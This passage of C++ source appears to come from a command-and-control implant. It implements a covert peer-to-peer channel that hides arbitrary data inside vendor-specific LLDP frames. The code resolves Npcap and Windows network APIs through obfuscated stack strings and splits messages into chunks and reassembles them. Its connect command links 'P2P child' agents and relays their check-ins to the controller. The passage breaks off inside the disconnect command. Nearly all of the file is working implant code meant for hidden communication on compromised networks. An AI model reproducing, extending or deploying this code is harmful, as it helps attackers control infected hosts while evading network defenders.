#include <common.h>
#include <commands.h>
#include <transport_lldp.h>
#include <parser.h>
#include <package.h>
#include <config.h>
#include <strings.h>
#include <base64.h>
#include <stackstr.h>

using namespace stardust;
using namespace starburst;

/* ================================================================
 *  NPCAP DLL RESOLUTION
 * ================================================================ */

auto declfn starburst::lldp_resolve_npcap(
    _Inout_ instance&       inst,
    _Out_   LldpLinkState*  state
) -> bool {
    if ( state->initialized ) return true;

    memory::zero( &state->npcap, sizeof( LldpNpcapApis ) );

    STK_WPCAP( _wpcap );
    state->h_wpcap = reinterpret_cast<HMODULE>(
        inst.kernel32.LoadLibraryA( _wpcap ) );

    if ( !state->h_wpcap ) {
        STK_NPCAP_PATH( _npcap_path );
        state->h_wpcap = reinterpret_cast<HMODULE>(
            inst.kernel32.LoadLibraryA( _npcap_path ) );
    }

    if ( !state->h_wpcap ) return false;

    state->npcap.pFindAllDevs = reinterpret_cast<lldp_fn_pcap_findalldevs>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_findalldevs" ) ) ) );
    state->npcap.pFreeAllDevs = reinterpret_cast<lldp_fn_pcap_freealldevs>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_freealldevs" ) ) ) );
    state->npcap.pOpenLive = reinterpret_cast<lldp_fn_pcap_open_live>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_open_live" ) ) ) );
    state->npcap.pSendPacket = reinterpret_cast<lldp_fn_pcap_sendpacket>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_sendpacket" ) ) ) );
    state->npcap.pNextEx = reinterpret_cast<lldp_fn_pcap_next_ex>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_next_ex" ) ) ) );
    state->npcap.pClose = reinterpret_cast<lldp_fn_pcap_close>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_close" ) ) ) );
    state->npcap.pSetNonblock = reinterpret_cast<lldp_fn_pcap_setnonblock>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_setnonblock" ) ) ) );
    state->npcap.pDatalink = reinterpret_cast<lldp_fn_pcap_datalink>(
        inst.kernel32.GetProcAddress( state->h_wpcap,
            symbol<char*>( const_cast<char*>( "pcap_datalink" ) ) ) );

    if ( !state->npcap.pFindAllDevs || !state->npcap.pOpenLive ||
         !state->npcap.pSendPacket || !state->npcap.pNextEx ||
         !state->npcap.pClose ) {
        return false;
    }

    state->initialized = true;
    return true;
}

/* ================================================================
 *  ADAPTER DISCOVERY & MAC RESOLUTION
 * ================================================================ */

static bool lldp_find_pcap_device(
    _Inout_ instance&       inst,
    _In_    LldpLinkState*  state,
    _In_    const char*     iface_name,
    _Out_   char*           dev_name_out,
    _In_    uint32_t        dev_name_max
) {
    lldp_pcap_if* alldevs = nullptr;
    char errbuf[256] = {};

    if ( state->npcap.pFindAllDevs( &alldevs, errbuf ) < 0 || !alldevs )
        return false;

    bool found = false;
    auto dev = alldevs;
    while ( dev ) {
        if ( dev->description && str_len( dev->description ) > 0 ) {
            if ( str_ncmp( dev->description, iface_name,
                           str_len( iface_name ) ) == 0 ) {
                uint32_t nlen = str_len( dev->name );
                if ( nlen < dev_name_max ) {
                    memory::copy( dev_name_out, dev->name, nlen );
                    dev_name_out[nlen] = '\0';
                    found = true;
                }
                break;
            }
        }
        dev = dev->next;
    }

    if ( !found ) {
        dev = alldevs;
        while ( dev ) {
            if ( dev->name ) {
                bool match = false;
                const char* p = dev->name;
                while ( *p ) {
                    if ( str_ncmp( p, iface_name, str_len( iface_name ) ) == 0 ) {
                        match = true;
                        break;
                    }
                    p++;
                }
                if ( match ) {
                    uint32_t nlen = str_len( dev->name );
                    if ( nlen < dev_name_max ) {
                        memory::copy( dev_name_out, dev->name, nlen );
                        dev_name_out[nlen] = '\0';
                        found = true;
                    }
                    break;
                }
            }
            dev = dev->next;
        }
    }

    if ( state->npcap.pFreeAllDevs )
        state->npcap.pFreeAllDevs( alldevs );

    return found;
}

static bool lldp_get_adapter_mac(
    _Inout_ instance&       inst,
    _In_    const char*     pcap_dev_name,
    _Out_   uint8_t*        mac_out
) {
    STK_IPHLPAPI( _n );
    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
    if ( !h_iphlpapi ) return false;

    auto pGetAdaptersInfo = reinterpret_cast<lldp_fn_GetAdaptersInfo>(
        inst.kernel32.GetProcAddress( h_iphlpapi,
            symbol<LPCSTR>( "GetAdaptersInfo" ) ) );
    if ( !pGetAdaptersInfo ) return false;

    ULONG buf_size = 0;
    pGetAdaptersInfo( nullptr, &buf_size );
    if ( buf_size == 0 ) return false;

    auto info = static_cast<LldpAdapterInfo*>( inst.heap_alloc( buf_size ) );
    if ( !info ) return false;

    if ( pGetAdaptersInfo( info, &buf_size ) != 0 ) {
        inst.heap_free( info );
        return false;
    }

    /* extract GUID from pcap device name: \Device\NPF_{GUID} */
    const char* guid_start = nullptr;
    const char* p = pcap_dev_name;
    while ( *p ) {
        if ( *p == '{' ) { guid_start = p; break; }
        p++;
    }

    bool found = false;
    auto adapter = info;
    while ( adapter ) {
        bool match = false;

        if ( guid_start ) {
            const char* a = adapter->AdapterName;
            while ( *a ) {
                if ( *a == '{' ) {
                    if ( str_ncmp( a, guid_start, str_len( guid_start ) ) == 0 )
                        match = true;
                    break;
                }
                a++;
            }
        }

        if ( match && adapter->AddressLength >= 6 ) {
            memory::copy( mac_out, adapter->Address, 6 );
            found = true;
            break;
        }
        adapter = adapter->Next;
    }

    inst.heap_free( info );
    return found;
}

typedef DWORD (WINAPI *lldp_fn_SendARP)( ULONG, ULONG, void*, PULONG );

static bool lldp_resolve_ip_to_mac(
    _Inout_ instance&   inst,
    _In_    const char* ip_str,
    _Out_   uint8_t*    mac_out
) {
    STK_IPHLPAPI( _n );
    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
    if ( !h_iphlpapi ) return false;

    auto pSendARP = reinterpret_cast<lldp_fn_SendARP>(
        inst.kernel32.GetProcAddress( h_iphlpapi,
            symbol<LPCSTR>( "SendARP" ) ) );
    if ( !pSendARP ) return false;

    STK_WS2_32( _ws );
    auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _ws ) );
    if ( !h_ws2 ) return false;

    auto p_inet_addr = reinterpret_cast<ULONG (__stdcall*)(const char*)>(
        inst.kernel32.GetProcAddress( h_ws2,
            symbol<LPCSTR>( "inet_addr" ) ) );
    if ( !p_inet_addr ) return false;

    ULONG dest_ip = p_inet_addr( ip_str );
    if ( dest_ip == 0 || dest_ip == 0xFFFFFFFF ) return false;

    uint8_t mac_buf[8] = {};
    ULONG mac_len = 6;

    DWORD ret = pSendARP( dest_ip, 0, mac_buf, &mac_len );
    if ( ret != 0 || mac_len < 6 ) return false;

    memory::copy( mac_out, mac_buf, 6 );
    return true;
}

auto declfn starburst::lldp_open_adapter(
    _Inout_ instance&       inst,
    _Inout_ LldpLinkState*  state,
    _In_    const char*     iface_name
) -> bool {
    if ( state->pcap_handle ) return true;

    char dev_name[512] = {};
    if ( !lldp_find_pcap_device( inst, state, iface_name, dev_name, sizeof(dev_name) ) ) {
        DBG_PRINT( inst, "lldp: adapter not found: %s\n", iface_name );
        return false;
    }

    DBG_PRINT( inst, "lldp: opening device %s\n", dev_name );

    if ( !lldp_get_adapter_mac( inst, dev_name, state->src_mac ) ) {
        DBG_PRINT( inst, "lldp: failed to resolve MAC for %s\n", dev_name );
        return false;
    }

    char errbuf[256] = {};
    state->pcap_handle = state->npcap.pOpenLive(
        dev_name, LLDP_MAX_FRAME, 1, LLDP_RECV_POLL_INTERVAL, errbuf );

    if ( !state->pcap_handle ) {
        DBG_PRINT( inst, "lldp: pcap_open_live failed: %s\n", errbuf );
        return false;
    }

    if ( state->npcap.pDatalink &&
         state->npcap.pDatalink( state->pcap_handle ) != 1 ) {
        DBG_PRINT( inst, "lldp: adapter is not Ethernet (DLT != 1)\n" );
        state->npcap.pClose( state->pcap_handle );
        state->pcap_handle = nullptr;
        return false;
    }

    DBG_PRINT( inst, "lldp: opened %s  MAC=%02x:%02x:%02x:%02x:%02x:%02x\n",
        dev_name,
        state->src_mac[0], state->src_mac[1], state->src_mac[2],
        state->src_mac[3], state->src_mac[4], state->src_mac[5] );

    return true;
}

/* ================================================================
 *  TLV HELPERS
 * ================================================================ */

static void tlv_write_hdr( uint8_t* buf, uint8_t type, uint16_t length ) {
    uint16_t hdr = ( (uint16_t)type << 9 ) | ( length & 0x01FF );
    buf[0] = ( hdr >> 8 ) & 0xFF;
    buf[1] = hdr & 0xFF;
}

static void tlv_read_hdr( const uint8_t* buf, uint8_t* type, uint16_t* length ) {
    uint16_t hdr = ( (uint16_t)buf[0] << 8 ) | buf[1];
    *type   = ( hdr >> 9 ) & 0x7F;
    *length = hdr & 0x01FF;
}

struct LldpParsedChunk {
    uint32_t msg_id;
    uint16_t seq_no;
    uint16_t total;
    uint8_t  data[LLDP_MAX_CHUNK_DATA];
    uint16_t data_len;
};

/* ================================================================
 *  LLDP FRAME BUILD / PARSE
 * ================================================================ */

static uint32_t lldp_build_frame(
    uint8_t*  frame,
    uint8_t*  dst_mac,
    uint8_t*  src_mac,
    uint8_t*  oui,
    uint8_t   subtype,
    uint32_t  msg_id,
    uint16_t  seq_no,
    uint16_t  total_chunks,
    uint8_t*  chunk_data,
    uint16_t  chunk_len
) {
    uint8_t* p = frame;

    memory::copy( p, dst_mac, 6 ); p += 6;
    memory::copy( p, src_mac, 6 ); p += 6;
    p[0] = 0x88; p[1] = 0xCC; p += 2;

    /* Chassis ID TLV: subtype MAC */
    tlv_write_hdr( p, LLDP_TLV_CHASSIS_ID, 7 ); p += 2;
    *p++ = LLDP_CHASSIS_MAC;
    memory::copy( p, src_mac, 6 ); p += 6;

    /* Port ID TLV: subtype local, "lldp" */
    tlv_write_hdr( p, LLDP_TLV_PORT_ID, 5 ); p += 2;
    *p++ = LLDP_PORT_LOCAL;
    memory::copy( p, symbol<char*>( const_cast<char*>( "lldp" ) ), 4 ); p += 4;

    /* TTL TLV */
    tlv_write_hdr( p, LLDP_TLV_TTL, 2 ); p += 2;
    p[0] = 0; p[1] = 120; p += 2;

    /* Org-Specific TLV with chunk data */
    uint16_t org_len = 3 + 1 + LLDP_CHUNK_HDR_SIZE + chunk_len;
    tlv_write_hdr( p, LLDP_TLV_ORG_SPEC, org_len ); p += 2;
    memory::copy( p, oui, 3 ); p += 3;
    *p++ = subtype;

    /* chunk header: msg_id(4) + seq_no(2) + total(2) */
    p[0] = ( msg_id >> 24 ) & 0xFF;
    p[1] = ( msg_id >> 16 ) & 0xFF;
    p[2] = ( msg_id >> 8 )  & 0xFF;
    p[3] = msg_id & 0xFF;
    p[4] = ( seq_no >> 8 )  & 0xFF;
    p[5] = seq_no & 0xFF;
    p[6] = ( total_chunks >> 8 ) & 0xFF;
    p[7] = total_chunks & 0xFF;
    p += 8;

    if ( chunk_len > 0 && chunk_data )
        memory::copy( p, chunk_data, chunk_len );
    p += chunk_len;

    /* End TLV */
    tlv_write_hdr( p, LLDP_TLV_END, 0 ); p += 2;

    return static_cast<uint32_t>( p - frame );
}

static int lldp_parse_frame(
    uint8_t*   frame,
    uint32_t   frame_len,
    uint8_t*   oui,
    uint8_t    subtype,
    uint8_t*   src_mac_out,
    uint32_t*  msg_id_out,
    uint16_t*  seq_no_out,
    uint16_t*  total_out,
    uint8_t*   data_out,
    uint16_t*  data_len_out
) {
    if ( frame_len < 14 ) return -1;

    uint16_t ethertype = ( (uint16_t)frame[12] << 8 ) | frame[13];
    if ( ethertype != LLDP_ETH_P_LLDP ) return -1;

    if ( src_mac_out ) memory::copy( src_mac_out, frame + 6, 6 );

    uint8_t* p = frame + 14;
    uint32_t remaining = frame_len - 14;

    while ( remaining >= 2 ) {
        uint8_t  tlv_type;
        uint16_t tlv_len;
        tlv_read_hdr( p, &tlv_type, &tlv_len );
        p += 2; remaining -= 2;

        if ( tlv_type == LLDP_TLV_END ) break;
        if ( tlv_len > remaining ) return -1;

        if ( tlv_type == LLDP_TLV_ORG_SPEC && tlv_len >= 4 + LLDP_CHUNK_HDR_SIZE ) {
            if ( memory::compare( p, oui, 3 ) == 0 && p[3] == subtype ) {
                uint8_t* hdr = p + 4;
                *msg_id_out = ( (uint32_t)hdr[0] << 24 ) | ( (uint32_t)hdr[1] << 16 ) |
                              ( (uint32_t)hdr[2] << 8 )  | hdr[3];
                *seq_no_out = ( (uint16_t)hdr[4] << 8 ) | hdr[5];
                *total_out  = ( (uint16_t)hdr[6] << 8 ) | hdr[7];
                uint16_t dlen = tlv_len - 4 - LLDP_CHUNK_HDR_SIZE;
                if ( data_out && dlen > 0 )
                    memory::copy( data_out, hdr + LLDP_CHUNK_HDR_SIZE, dlen );
                *data_len_out = dlen;
                return 0;
            }
        }

        p += tlv_len;
        remaining -= tlv_len;
    }

    return -1;
}

static int lldp_parse_frame_multi(
    uint8_t*          frame,
    uint32_t          frame_len,
    uint8_t*          oui,
    uint8_t           subtype,
    uint8_t*          src_mac_out,
    LldpParsedChunk*  out,
    int               max_out
) {
    if ( frame_len < 14 ) return 0;
    uint16_t ethertype = ( (uint16_t)frame[12] << 8 ) | frame[13];
    if ( ethertype != LLDP_ETH_P_LLDP ) return 0;
    if ( src_mac_out ) memory::copy( src_mac_out, frame + 6, 6 );

    uint8_t* p = frame + 14;
    uint32_t remaining = frame_len - 14;
    int count = 0;

    while ( remaining >= 2 && count < max_out ) {
        uint8_t  tlv_type;
        uint16_t tlv_len;
        tlv_read_hdr( p, &tlv_type, &tlv_len );
        p += 2; remaining -= 2;
        if ( tlv_type == LLDP_TLV_END ) break;
        if ( tlv_len > remaining ) break;

        if ( tlv_type == LLDP_TLV_ORG_SPEC && tlv_len >= 4 + LLDP_CHUNK_HDR_SIZE ) {
            if ( memory::compare( p, oui, 3 ) == 0 && p[3] == subtype ) {
                uint8_t* hdr = p + 4;
                out[count].msg_id = ( (uint32_t)hdr[0] << 24 ) | ( (uint32_t)hdr[1] << 16 ) |
                                    ( (uint32_t)hdr[2] << 8 )  | hdr[3];
                out[count].seq_no = ( (uint16_t)hdr[4] << 8 ) | hdr[5];
                out[count].total  = ( (uint16_t)hdr[6] << 8 ) | hdr[7];
                uint16_t dlen = tlv_len - 4 - LLDP_CHUNK_HDR_SIZE;
                if ( dlen > LLDP_MAX_CHUNK_DATA ) dlen = LLDP_MAX_CHUNK_DATA;
                if ( dlen > 0 ) memory::copy( out[count].data, hdr + LLDP_CHUNK_HDR_SIZE, dlen );
                out[count].data_len = dlen;
                count++;
            }
        }
        p += tlv_len;
        remaining -= tlv_len;
    }
    return count;
}

/* ================================================================
 *  SEND / RECEIVE WITH CHUNKING
 * ================================================================ */

static int lldp_send_data(
    _Inout_ instance&       inst,
    _In_    LldpLinkState*  state,
    _In_    uint8_t*        dst_mac,
    _In_    uint8_t*        data,
    _In_    uint32_t        data_len
) {
    uint32_t msg_id = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
    uint16_t total  = static_cast<uint16_t>(
        ( data_len + LLDP_MAX_CHUNK_DATA - 1 ) / LLDP_MAX_CHUNK_DATA );
    if ( total == 0 ) total = 1;

    uint8_t frame[LLDP_MAX_FRAME];
    uint16_t seq = 0;

    while ( seq < total ) {
        uint8_t* p = frame;

        memory::copy( p, dst_mac, 6 ); p += 6;
        memory::copy( p, state->src_mac, 6 ); p += 6;
        p[0] = 0x88; p[1] = 0xCC; p += 2;

        tlv_write_hdr( p, LLDP_TLV_CHASSIS_ID, 7 ); p += 2;
        *p++ = LLDP_CHASSIS_MAC;
        memory::copy( p, state->src_mac, 6 ); p += 6;

        tlv_write_hdr( p, LLDP_TLV_PORT_ID, 5 ); p += 2;
        *p++ = LLDP_PORT_LOCAL;
        memory::copy( p, symbol<char*>( const_cast<char*>( "lldp" ) ), 4 ); p += 4;

        tlv_write_hdr( p, LLDP_TLV_TTL, 2 ); p += 2;
        p[0] = 0; p[1] = 120; p += 2;

        while ( seq < total ) {
            uint32_t off = (uint32_t)seq * LLDP_MAX_CHUNK_DATA;
            uint16_t clen = static_cast<uint16_t>( data_len - off );
            if ( clen > LLDP_MAX_CHUNK_DATA ) clen = LLDP_MAX_CHUNK_DATA;

            uint16_t org_len = 3 + 1 + LLDP_CHUNK_HDR_SIZE + clen;
            if ( (uint32_t)( p - frame ) + 2 + org_len + 2 > LLDP_MAX_FRAME )
                break;

            tlv_write_hdr( p, LLDP_TLV_ORG_SPEC, org_len ); p += 2;
            memory::copy( p, state->oui, 3 ); p += 3;
            *p++ = state->subtype;

            p[0] = ( msg_id >> 24 ) & 0xFF;
            p[1] = ( msg_id >> 16 ) & 0xFF;
            p[2] = ( msg_id >> 8 )  & 0xFF;
            p[3] = msg_id & 0xFF;
            p[4] = ( seq >> 8 )  & 0xFF;
            p[5] = seq & 0xFF;
            p[6] = ( total >> 8 ) & 0xFF;
            p[7] = total & 0xFF;
            p += 8;

            if ( clen > 0 ) memory::copy( p, data + off, clen );
            p += clen;
            seq++;
        }

        tlv_write_hdr( p, LLDP_TLV_END, 0 ); p += 2;

        if ( state->npcap.pSendPacket( state->pcap_handle,
                frame, static_cast<int>( p - frame ) ) != 0 ) {
            DBG_PRINT( inst, "lldp: send frame failed at seq %u/%u\n", seq, total );
            return -1;
        }
        SleepMs( 1 );
    }

    return 0;
}

struct LldpReassembly {
    uint32_t msg_id;
    uint16_t total;
    uint16_t received;
    uint8_t  src_mac[6];
    uint8_t* chunks[256];
    uint16_t chunk_lens[256];
    uint8_t  chunk_present[256];
};

static int lldp_recv_message(
    _Inout_ instance&       inst,
    _In_    LldpLinkState*  state,
    _Out_   uint8_t*        src_mac_out,
    _Out_   uint8_t**       data_out,
    _Out_   uint32_t*       data_len_out,
    _In_    int             timeout_ms
) {
    *data_out     = nullptr;
    *data_len_out = 0;

    LldpReassembly ctx;
    memory::zero( &ctx, sizeof( ctx ) );

    DWORD start_tick = inst.kernel32.GetTickCount();

    while ( true ) {
        DWORD elapsed = inst.kernel32.GetTickCount() - start_tick;
        if ( elapsed >= (DWORD)timeout_ms ) break;

        lldp_pcap_pkthdr* pkt_hdr = nullptr;
        const uint8_t*    pkt_data = nullptr;

        int ret = state->npcap.pNextEx( state->pcap_handle, &pkt_hdr, &pkt_data );
        if ( ret == 0 ) {
            SleepMs( 1 );
            continue;
        }
        if ( ret < 0 ) break;

        if ( !pkt_hdr || !pkt_data || pkt_hdr->caplen < 14 ) continue;

        uint8_t peer_mac[6];
        LldpParsedChunk parsed[LLDP_MAX_TLVS_PER_FRAME];
        int nchunks = lldp_parse_frame_multi(
            const_cast<uint8_t*>( pkt_data ), pkt_hdr->caplen,
            state->oui, state->subtype, peer_mac, parsed, LLDP_MAX_TLVS_PER_FRAME );
        if ( nchunks <= 0 ) continue;

        if ( memory::compare( peer_mac, state->src_mac, 6 ) == 0 )
            continue;

        for ( int ci = 0; ci < nchunks; ci++ ) {
            if ( ctx.msg_id == 0 ) {
                ctx.msg_id = parsed[ci].msg_id;
                ctx.total  = parsed[ci].total;
                memory::copy( ctx.src_mac, peer_mac, 6 );
            }

            if ( parsed[ci].msg_id != ctx.msg_id ) continue;
            if ( parsed[ci].seq_no >= 256 || parsed[ci].seq_no >= parsed[ci].total ) continue;

            if ( !ctx.chunk_present[parsed[ci].seq_no] ) {
                ctx.chunks[parsed[ci].seq_no] = static_cast<uint8_t*>(
                    inst.heap_alloc( parsed[ci].data_len ) );
                if ( ctx.chunks[parsed[ci].seq_no] ) {
                    memory::copy( ctx.chunks[parsed[ci].seq_no],
                                  parsed[ci].data, parsed[ci].data_len );
                    ctx.chunk_lens[parsed[ci].seq_no] = parsed[ci].data_len;
                    ctx.chunk_present[parsed[ci].seq_no] = 1;
                    ctx.received++;
                }
            }
        }

        if ( ctx.received >= ctx.total ) break;
    }

    if ( ctx.received < ctx.total ) {
        for ( uint16_t i = 0; i < 256; i++ )
            if ( ctx.chunks[i] ) inst.heap_free( ctx.chunks[i] );
        return -1;
    }

    uint32_t total_len = 0;
    for ( uint16_t i = 0; i < ctx.total; i++ )
        total_len += ctx.chunk_lens[i];

    auto buf = static_cast<uint8_t*>( inst.heap_alloc( total_len ) );
    if ( !buf ) {
        for ( uint16_t i = 0; i < ctx.total; i++ )
            if ( ctx.chunks[i] ) inst.heap_free( ctx.chunks[i] );
        return -1;
    }

    uint32_t off = 0;
    for ( uint16_t i = 0; i < ctx.total; i++ ) {
        memory::copy( buf + off, ctx.chunks[i], ctx.chunk_lens[i] );
        off += ctx.chunk_lens[i];
        inst.heap_free( ctx.chunks[i] );
    }

    memory::copy( src_mac_out, ctx.src_mac, 6 );
    *data_out     = buf;
    *data_len_out = total_len;
    return 0;
}

/* ================================================================
 *  HELPER: queue raw bytes to the response queue
 * ================================================================ */

static void lldp_queue_raw(
    _Inout_ instance&  inst,
    _In_    uint8_t*   data,
    _In_    uint32_t   data_len
) {
    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t nc = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( nc < needed ) nc *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, nc ) );
        inst.response_queue.capacity = nc;
    }
    auto qb = inst.response_queue.buffer + inst.response_queue.length;
    qb[0] = ( data_len >> 24 ) & 0xFF;
    qb[1] = ( data_len >> 16 ) & 0xFF;
    qb[2] = ( data_len >> 8 )  & 0xFF;
    qb[3] = data_len & 0xFF;
    memory::copy( qb + 4, data, data_len );
    inst.response_queue.length += 4 + data_len;
}

/* ================================================================
 *  HELPER: parse OUI hex string to bytes
 * ================================================================ */

static uint8_t hex_nibble( char c ) {
    if ( c >= '0' && c <= '9' ) return c - '0';
    if ( c >= 'a' && c <= 'f' ) return c - 'a' + 10;
    if ( c >= 'A' && c <= 'F' ) return c - 'A' + 10;
    return 0;
}

static void parse_oui_hex( const char* hex, uint32_t len, uint8_t* oui ) {
    oui[0] = 0x00; oui[1] = 0x00; oui[2] = 0x0C;
    if ( hex && len >= 6 ) {
        for ( int i = 0; i < 3; i++ )
            oui[i] = ( hex_nibble( hex[i*2] ) << 4 ) | hex_nibble( hex[i*2 + 1] );
    }
}

/* ================================================================
 *  CMD_LLDP_CONNECT
 * ================================================================ */

#ifdef INCLUDE_CMD_LLDP_CONNECT

auto declfn starburst::cmd_lldp_connect(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t iface_len = 0;
    auto iface_name = parser_string( params, &iface_len );

    uint32_t oui_len = 0;
    auto oui_hex = parser_string( params, &oui_len );

    uint8_t subtype = parser_byte( params );
    if ( subtype == 0 ) subtype = 0x01;

    char peer_ip_buf[64] = {};
    uint8_t peer_mac_resolved[6] = {};
    bool have_peer_mac = false;
    if ( parser_remaining( params ) > 0 ) {
        uint32_t pip_len = 0;
        auto pip = parser_string( params, &pip_len );
        if ( pip && pip_len > 0 && pip_len < sizeof(peer_ip_buf) ) {
            memory::copy( peer_ip_buf, pip, pip_len );
            peer_ip_buf[pip_len] = '\0';
            if ( lldp_resolve_ip_to_mac( inst, peer_ip_buf, peer_mac_resolved ) ) {
                have_peer_mac = true;
                DBG_PRINT( inst, "lldp_connect: resolved %s -> %02x:%02x:%02x:%02x:%02x:%02x\n",
                    peer_ip_buf, peer_mac_resolved[0], peer_mac_resolved[1],
                    peer_mac_resolved[2], peer_mac_resolved[3],
                    peer_mac_resolved[4], peer_mac_resolved[5] );
            } else {
                DBG_PRINT( inst, "lldp_connect: ARP resolution failed for %s, using broadcast\n",
                    peer_ip_buf );
            }
        }
    }

    if ( !iface_name || iface_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing interface name" ) ) );
        return;
    }

    char iface_buf[260] = {};
    uint32_t cp = iface_len > 259 ? 259 : iface_len;
    memory::copy( iface_buf, iface_name, cp );
    iface_buf[cp] = '\0';

    /* allocate or reuse link state */
    auto state = static_cast<LldpLinkState*>( inst.lldp_link_state );
    if ( !state ) {
        state = static_cast<LldpLinkState*>(
            inst.heap_alloc( sizeof( LldpLinkState ) ) );
        if ( !state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }
        memory::zero( state, sizeof( LldpLinkState ) );
        inst.lldp_link_state = state;
    }

    /* resolve Npcap */
    if ( !lldp_resolve_npcap( inst, state ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load Npcap (wpcap.dll)" ) ) );
        return;
    }

    /* set OUI / subtype */
    parse_oui_hex( oui_hex, oui_len, state->oui );
    state->subtype = subtype;

    /* open adapter */
    if ( !lldp_open_adapter( inst, state, iface_buf ) ) {
        char err_buf[300] = {};
        str_copy( err_buf, symbol<char*>( const_cast<char*>( "failed to open adapter: " ) ) );
        str_concat( err_buf, iface_buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
        return;
    }

    DBG_PRINT( inst, "lldp_connect: listening on %s for OUI %02x%02x%02x sub %02x\n",
        iface_buf, state->oui[0], state->oui[1], state->oui[2], state->subtype );

    /* wait for P2P child's checkin over LLDP */
    uint8_t  peer_mac[6];
    uint8_t* p2p_data = nullptr;
    uint32_t p2p_len  = 0;

    if ( lldp_recv_message( inst, state, peer_mac, &p2p_data, &p2p_len,
                            LLDP_CONNECT_TIMEOUT_MS ) < 0 || !p2p_data ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no LLDP response from P2P agent" ) ) );
        return;
    }

    /* create link */
    auto link = static_cast<instance::LldpLink*>(
        inst.heap_alloc( sizeof( instance::LldpLink ) ) );
    if ( !link ) {
        inst.heap_free( p2p_data );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    memory::zero( link, sizeof( instance::LldpLink ) );
    memory::copy( link->task_uuid, task_uuid, 36 );
    link->link_id = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
    memory::copy( link->peer_mac, peer_mac, 6 );
    link->connected = true;

    /* extract UUID from the P2P agent's response */
    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, p2p_data,
        p2p_len > 48 ? 48 : p2p_len, &decoded_len );
    if ( decoded && decoded_len >= 36 ) {
        link->agent_id = static_cast<char*>( inst.heap_alloc( 37 ) );
        if ( link->agent_id ) {
            memory::copy( link->agent_id, decoded, 36 );
            link->agent_id[36] = '\0';
        }
    }
    if ( decoded ) inst.heap_free( decoded );

    /* prepend to linked list */
    link->next = inst.lldp_links;
    inst.lldp_links = link;

    DBG_PRINT( inst, "lldp_connect: linked id=%d agent=%s\n",
        link->link_id, link->agent_id ? link->agent_id : "?" );

    /* queue ACTION_LINK_ADD */
    auto pkg = package_create( inst );
    if ( !pkg ) {
        inst.heap_free( p2p_data );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    package_add_byte( inst, pkg, ACTION_LINK_ADD );
    package_add_byte( inst, pkg, C2_PROFILE_LLDP );
    package_add_int32( inst, pkg, link->link_id );
    package_add_string( inst, pkg, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "" ) ) );
    package_add_bytes( inst, pkg, p2p_data, p2p_len );

    inst.heap_free( p2p_data );

    uint32_t pkg_len = 0;
    auto pkg_data = package_build( pkg, &pkg_len );
    lldp_queue_raw( inst, pkg_data, pkg_len );
    package_destroy( inst, pkg );

    /* success response */
    char resp_buf[512] = {};
    str_copy( resp_buf, symbol<char*>( const_cast<char*>( "LLDP linked to " ) ) );

    char mac_str[18] = {};
    for ( int i = 0; i < 6; i++ ) {
        mac_str[i*3]   = "0123456789abcdef"[peer_mac[i] >> 4];
        mac_str[i*3+1] = "0123456789abcdef"[peer_mac[i] & 0x0F];
        mac_str[i*3+2] = ( i < 5 ) ? ':' : '\0';
    }
    str_concat( resp_buf, mac_str );
    str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
    str_concat( resp_buf, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "unknown" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
}

#endif /* INCLUDE_CMD_LLDP_CONNECT */

/* ================================================================
 *  CMD_LLDP_DISCONNECT
 * ================================================================ */

#ifdef INCLUDE_CMD_LLDP_DISCONNECT

auto declfn starburst::cmd_lldp_disconnect(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t agent_uuid_len = 0;
    auto agent_uuid = parser_string( params, &agent_uuid_len );

    if ( !agent_uuid || agent_uuid_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing agent id" ) ) );
        return;
    }

    instance::LldpLink* prev = nullptr;
    instance::LldpLink* cur  = inst.lldp_links;
    bool found = false;

    while ( cur ) {
        if ( cur->agent_id && agent_uuid_len > 0 &&
             str_ncmp( cur->agent_id, agent_uuid, agent_uuid_len ) == 0 ) {

            if ( prev ) prev->next = cur->next;
            else        inst.lldp_links = cur->next;

